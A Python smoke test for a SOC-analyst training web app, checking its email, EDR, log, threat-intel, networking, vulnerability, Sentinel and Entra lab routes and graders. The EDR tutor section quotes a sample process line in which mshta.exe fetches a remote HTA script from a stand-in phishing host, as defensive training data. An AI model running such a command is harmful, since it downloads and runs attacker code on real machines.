"""Smoke test G1–G9 / G5 / G11 Career Hub gap builds."""
import os
import sys
import tempfile
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[1]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

os.environ["SEED_DB"] = "true"
import app as app_module
import career_lab
import email_lab
import edr_lab
import log_lab
import intel_lab
import net_lab
import net_learn
import vuln_lab
import sentinel_lab
import entra_lab

tmp = Path(tempfile.mkdtemp()) / "gap_smoke.db"
app_module.DB_PATH = tmp
app_module.init_db()
app_module.app.config["TESTING"] = True
app_module.app.config["WTF_CSRF_ENABLED"] = False
c = app_module.app.test_client()

app_module.db_run(
    f"UPDATE users SET role = {app_module.PH} WHERE username = {app_module.PH}",
    ("analyst", "admin"),
)
row = app_module.db_fetchone(
    f"SELECT id FROM users WHERE username = {app_module.PH}",
    ("admin",),
)
with c.session_transaction() as sess:
    sess["username"] = "admin"
    sess["role"] = "analyst"
    sess["user_id"] = row["id"]
    sess["analyst_mode"] = "study"

results = []

r = c.get("/career/email")
results.append(("email hub", r.status_code, b"Email Triage" in r.data and b"SPF" in r.data))

r = c.get("/career/email/bec_cfo_wire?seed=eeee5555")
results.append(("email sample", r.status_code, b"wire" in r.data.lower()))

raw = email_lab.get_sample("bec_cfo_wire")["raw"]
r = c.post("/api/career/email/parse", json={"raw": raw})
d = r.get_json()
results.append(("email parse", r.status_code, bool(d.get("ok") and d.get("spf") == "fail")))

checklist = email_lab.get_sample("bec_cfo_wire")["checklist_answers"]
r = c.post(
    "/api/career/email/grade",
    json={
        "sample_id": "bec_cfo_wire",
        "checklist": checklist,
        "disposition": "escalate_interaction_unknown",
    },
)
d = r.get_json()
results.append(("email grade pass", r.status_code, bool(d.get("ok") and d.get("passed"))))

r = c.post(
    "/api/career/email/grade",
    json={
        "sample_id": "bec_cfo_wire",
        "checklist": {k: False for k in checklist},
        "disposition": "close_benign",
    },
)
d = r.get_json()
results.append(("email grade fail", r.status_code, bool(d.get("ok") and not d.get("passed"))))

r = c.get("/career")
results.append(
    (
        "career hub cards",
        r.status_code,
        b"Email Triage" in r.data
        and b"EDR Console" in r.data
        and b"Log Sources" in r.data
        and b"IOC Enrichment" in r.data
        and b"Net-for-SOC" in r.data
        and b"Vuln Queue" in r.data
        and b"Sentinel Workspace" in r.data
        and b"Entra CA" in r.data,
    )
)
# Net-for-SOC prove-it gate on Career hub (mirrors KQL/Sec+ readiness wiring)
results.append(
    (
        "career hub net gate",
        r.status_code,
        b"Net-for-SOC" in r.data
        and b"All lessons + every lesson quiz" in r.data
        and b"0/" + str(len(net_learn.LESSONS)).encode() in r.data,
    )
)

r = c.post("/career/shift/start", json={"mode": "quick"})
d = r.get_json()
alerts = d.get("alerts") or []
has_client = all(
    a.get("client_id") and a.get("client_name") and a.get("sla_seconds") for a in alerts
)
clients = {a["client_id"] for a in alerts}
results.append(
    ("shift start multi-client", r.status_code, bool(has_client and len(clients) >= 2))
)
sid = d.get("session_id")

full = career_lab.alerts_from_json(
    app_module.db_fetchone(
        f"SELECT alerts_json FROM career_shift_sessions WHERE id = {app_module.PH}",
        (sid,),
    )["alerts_json"]
)
answers = []
for a in full[:3]:
    answers.append(
        {
            "idx": a["idx"],
            "disposition": a["correct_disposition"],
            "mitre": a.get("correct_mitre") or "",
            "client_id": a["client_id"],
            "summary": "Short summary of the alert pattern here",
            "next_action": "Block source and open IR case",
            "notes": "What: test\nNext: escalate",
            "elapsed_sec": 30,
        }
    )
r = c.post("/career/shift/complete", json={"session_id": sid, "answers": answers})
d = r.get_json()
graded = (d.get("result") or {}).get("graded") or []
client_ok = all(g.get("client_ok") for g in graded)
sla_ok = all(g.get("sla_ok") for g in graded)
results.append(
    ("shift complete G2/G3", r.status_code, bool(d.get("ok") and client_ok and sla_ok and graded))
)

r = c.get("/career/edr")
body_l = r.data.lower()
results.append(
    (
        "edr hub",
        r.status_code,
        b"EDR Console" in r.data and (b"process" in body_l or b"isolate" in body_l),
    )
)

r = c.get("/career/edr/excel_ps_enc", follow_redirects=False)
loc = r.headers.get("Location") or ""
results.append(
    (
        "edr case seed redirect",
        200 if (r.status_code in (301, 302) and "seed=" in loc) else r.status_code,
        r.status_code in (301, 302) and "seed=" in loc,
    )
)

r1 = c.get("/career/edr/excel_ps_enc?seed=aaaa1111")
r2 = c.get("/career/edr/excel_ps_enc?seed=bbbb2222")
h1 = edr_lab.materialize_case("excel_ps_enc", "aaaa1111")["host"]
h2 = edr_lab.materialize_case("excel_ps_enc", "bbbb2222")["host"]
results.append(
    (
        "edr case variants",
        r1.status_code,
        r1.status_code == 200
        and r2.status_code == 200
        and b"powershell" in r1.data.lower()
        and b"Isolate" in r1.data
        and b"Ask Tutor" in r1.data
        and h1 != h2,
    )
)

case = edr_lab.get_case("excel_ps_enc")
r = c.post(
    "/api/career/edr/grade",
    json={
        "case_id": "excel_ps_enc",
        "checklist": case["checklist_answers"],
        "isolate": True,
        "disposition": "isolate_escalate",
    },
)
d = r.get_json()
nxt = d.get("next") or {}
results.append(
    (
        "edr grade pass + next",
        r.status_code,
        bool(
            d.get("ok")
            and d.get("passed")
            and nxt.get("case_id")
            and nxt.get("case_id") != "excel_ps_enc"
            and nxt.get("url")
            and "seed=" in nxt.get("url", "")
        ),
    )
)

# Tutor context for EDR (system prompt build; skip live Ollama if down)
import career_tutor

sys_prompt = career_tutor.build_hands_on_tutor_system(
    "edr",
    {
        "case_id": "lolbin_mshta",
        "title": "Browser → mshta → script",
        "host": "WS-MKT-07",
        "user": "a.chen",
        "tree_lines": ["! [5520] mshta.exe  mshta.exe http://phish.example/upd.hta"],
        "legend": edr_lab.CONSOLE_LEGEND,
    },
)
results.append(
    (
        "edr tutor context prompt",
        200,
        "mshta" in sys_prompt.lower()
        and "plain english" in sys_prompt.lower()
        and "endpoint detection" in sys_prompt.lower(),
    )
)

r = c.post(
    "/api/career/tutor",
    json={
        "message": "What does the mshta line mean?",
        "track": "edr",
        "lesson_id": "lolbin_mshta",
        "history": [],
        "context": {
            "case_id": "lolbin_mshta",
            "title": "Browser → mshta → script",
            "tree_lines": ["! [5520] mshta.exe  mshta.exe http://phish.example/upd.hta"],
        },
    },
)
td = r.get_json() or {}
# Pass if Ollama answers, or clean unavailable error (env without Ollama).
tutor_ok = bool(td.get("reply")) or (
    isinstance(td.get("error"), str) and "ollama" in td.get("error", "").lower()
)
results.append(("edr tutor endpoint", r.status_code if td.get("reply") else 200, tutor_ok))

r = c.post(
    "/api/career/edr/grade",
    json={
        "case_id": "excel_ps_enc",
        "checklist": {k: False for k in case["checklist_answers"]},
        "isolate": False,
        "disposition": "close_fp",
    },
)
d = r.get_json()
results.append(("edr grade fail", r.status_code, bool(d.get("ok") and not d.get("passed"))))

r = c.get("/career/shift")
results.append(
    ("shift lobby", r.status_code, b"Contoso" in r.data or b"NorthPeak" in r.data)
)

# --- G8 Log Source Lab ---
r = c.get("/career/logs")
results.append(
    (
        "logs hub",
        r.status_code,
        b"Log Source" in r.data and b"4625" in r.data and b"flashcard" in r.data.lower(),
    )
)

r = c.get("/career/logs/win_4625_spray?seed=cccc3333")
results.append(
    (
        "logs drill",
        r.status_code,
        b"4625" in r.data and b"Source Network" in r.data and b"Ask Tutor" in r.data,
    )
)
ld1 = log_lab.materialize_drill("win_4625_spray", "cccc3333")
ld2 = log_lab.materialize_drill("win_4625_spray", "dddd4444")
results.append(
    ("logs drill variants", 200, ld1["snippet"] != ld2["snippet"])
)

drill = log_lab.get_drill("win_4625_spray")
r = c.post(
    "/api/career/logs/grade",
    json={
        "drill_id": "win_4625_spray",
        "source_id": drill["correct_source"],
        "evidence_id": drill["correct_evidence"],
        "checklist": drill["checklist_answers"],
    },
)
d = r.get_json()
results.append(("logs grade pass", r.status_code, bool(d.get("ok") and d.get("passed"))))

r = c.post(
    "/api/career/logs/grade",
    json={
        "drill_id": "win_4625_spray",
        "source_id": "proxy",
        "evidence_id": "m365_signin",
        "checklist": {k: False for k in drill["checklist_answers"]},
    },
)
d = r.get_json()
results.append(("logs grade fail", r.status_code, bool(d.get("ok") and not d.get("passed"))))

# --- G6 IOC Enrichment Lab ---
r = c.get("/career/intel")
results.append(
    (
        "intel hub",
        r.status_code,
        b"IOC Enrichment" in r.data and b"reputation" in r.data.lower(),
    )
)

r = c.post("/api/career/intel/lookup", json={"ioc": "203.0.113.88"})
d = r.get_json()
results.append(
    (
        "intel lookup malicious",
        r.status_code,
        bool(d.get("ok") and d.get("found") and d.get("verdict") == "malicious"),
    )
)

r = c.get("/career/intel/c2_ip_download?seed=ffff6666")
results.append(
    ("intel case", r.status_code, b"203.0.113.88" in r.data and b"ticket note" in r.data.lower())
)

icase = intel_lab.get_case("c2_ip_download")
r = c.post(
    "/api/career/intel/grade",
    json={
        "case_id": "c2_ip_download",
        "checklist": icase["checklist_answers"],
        "disposition": icase["correct_disposition"],
        "note": (
            "Looked up 203.0.113.88. Verdict malicious (C2). "
            "Recommend escalate with host WS-HR-03 evidence."
        ),
    },
)
d = r.get_json()
results.append(("intel grade pass", r.status_code, bool(d.get("ok") and d.get("passed"))))

r = c.post(
    "/api/career/intel/grade",
    json={
        "case_id": "c2_ip_download",
        "checklist": {k: False for k in icase["checklist_answers"]},
        "disposition": "ignore_no_lookup",
        "note": "nope",
    },
)
d = r.get_json()
results.append(("intel grade fail", r.status_code, bool(d.get("ok") and not d.get("passed"))))

# --- G9 Networking for Analysts ---
r = c.get("/career/net")
results.append(
    (
        "net hub",
        r.status_code,
        b"Networking" in r.data
        and b"3389" in r.data
        and b"flashcard" in r.data.lower()
        and b"Learn spine" in r.data
        and b"SOC-focused" in r.data,
    )
)

first_lesson = net_learn.LESSONS[0]["id"]
r = c.get(f"/career/net/lesson/{first_lesson}")
results.append(
    (
        "net lesson",
        r.status_code,
        b"Show me" in r.data and b"Mark Show me" in r.data,
    )
)
r = c.get(f"/career/net/practice/{first_lesson}")
results.append(("net practice", r.status_code, b"Help me" in r.data))
r = c.get(f"/career/net/quiz/{first_lesson}")
results.append(("net quiz", r.status_code, b"prove it" in r.data.lower()))

r = c.get("/career/net/egress_4444?seed=aaaa7777")
results.append(
    ("net drill", r.status_code, b"4444" in r.data and b"direction" in r.data.lower())
)

ndrill = net_lab.get_drill("egress_4444")
r = c.post(
    "/api/career/net/grade",
    json={
        "drill_id": "egress_4444",
        "signal_id": ndrill["correct_signal"],
        "direction_id": ndrill["correct_direction"],
        "checklist": ndrill["checklist_answers"],
    },
)
d = r.get_json()
results.append(("net grade pass", r.status_code, bool(d.get("ok") and d.get("passed"))))

r = c.post(
    "/api/career/net/grade",
    json={
        "drill_id": "egress_4444",
        "signal_id": "ssh_22",
        "direction_id": "east_west",
        "checklist": {k: False for k in ndrill["checklist_answers"]},
    },
)
d = r.get_json()
results.append(("net grade fail", r.status_code, bool(d.get("ok") and not d.get("passed"))))

# --- G7 Vulnerability Queue ---
r = c.get("/career/vuln")
results.append(
    (
        "vuln hub",
        r.status_code,
        b"Vulnerability Queue" in r.data and b"CVSS" in r.data,
    )
)

r = c.get("/career/vuln/rdp_internet_critical?seed=bbbb8888")
results.append(
    ("vuln case", r.status_code, b"3389" in r.data and b"Priority" in r.data)
)

vcase = vuln_lab.get_case("rdp_internet_critical")
r = c.post(
    "/api/career/vuln/grade",
    json={
        "case_id": "rdp_internet_critical",
        "priority_id": vcase["correct_priority"],
        "disposition": vcase["correct_disposition"],
        "checklist": vcase["checklist_answers"],
    },
)
d = r.get_json()
results.append(("vuln grade pass", r.status_code, bool(d.get("ok") and d.get("passed"))))

r = c.post(
    "/api/career/vuln/grade",
    json={
        "case_id": "rdp_internet_critical",
        "priority_id": "p4_accept_or_fp",
        "disposition": "ignore_cvss_only",
        "checklist": {k: False for k in vcase["checklist_answers"]},
    },
)
d = r.get_json()
results.append(("vuln grade fail", r.status_code, bool(d.get("ok") and not d.get("passed"))))

# --- G5 Sentinel Workspace Lab ---
r = c.get("/career/sentinel")
results.append(
    (
        "sentinel hub",
        r.status_code,
        b"Sentinel Workspace" in r.data
        and b"Incidents" in r.data
        and b"Entities" in r.data
        and b"Hunting" in r.data,
    )
)

r = c.get("/career/sentinel/spray_signin_fail?seed=cccc9999")
# Seed may rewrite the practice IP; still require SigninLogs + Incidents blades.
results.append(
    (
        "sentinel case",
        r.status_code,
        b"SigninLogs" in r.data and b"Incidents" in r.data,
    )
)

scase = sentinel_lab.get_case("spray_signin_fail")
r = c.post(
    "/api/career/sentinel/grade",
    json={
        "case_id": "spray_signin_fail",
        "checklist": scase["checklist_answers"],
        "blade_id": scase["correct_blade"],
        "disposition": scase["correct_disposition"],
    },
)
d = r.get_json()
results.append(("sentinel grade pass", r.status_code, bool(d.get("ok") and d.get("passed"))))

r = c.post(
    "/api/career/sentinel/grade",
    json={
        "case_id": "spray_signin_fail",
        "checklist": {k: False for k in scase["checklist_answers"]},
        "blade_id": "incidents",
        "disposition": "watch_only",
    },
)
d = r.get_json()
results.append(("sentinel grade fail", r.status_code, bool(d.get("ok") and not d.get("passed"))))

# --- G11 Entra Conditional Access Lab ---
r = c.get("/career/entra")
results.append(
    (
        "entra hub",
        r.status_code,
        b"Conditional Access" in r.data and b"Entra" in r.data,
    )
)

r = c.get("/career/entra/legacy_auth_block?seed=dddd0000")
results.append(
    (
        "entra case",
        r.status_code,
        b"legacy" in r.data.lower() and b"Block" in r.data,
    )
)

ecase = entra_lab.get_case("legacy_auth_block")
r = c.post(
    "/api/career/entra/grade",
    json={
        "case_id": "legacy_auth_block",
        "checklist": ecase["checklist_answers"],
        "outcome_id": ecase["correct_outcome"],
        "disposition": ecase["correct_disposition"],
    },
)
d = r.get_json()
results.append(("entra grade pass", r.status_code, bool(d.get("ok") and d.get("passed"))))

r = c.post(
    "/api/career/entra/grade",
    json={
        "case_id": "legacy_auth_block",
        "checklist": {k: False for k in ecase["checklist_answers"]},
        "outcome_id": "ca_not_related",
        "disposition": "disable_all_ca",
    },
)
d = r.get_json()
results.append(("entra grade fail", r.status_code, bool(d.get("ok") and not d.get("passed"))))

print("--- SMOKE RESULTS ---")
all_ok = True
for name, code, ok in results:
    status = "OK" if (code == 200 and ok) else "FAIL"
    if status == "FAIL":
        all_ok = False
    print(f"{status:4}  {name}: http={code} check={ok}")
print("ALL_PASS" if all_ok else "SOME_FAILED")
print(f"COUNT {len(results)}")
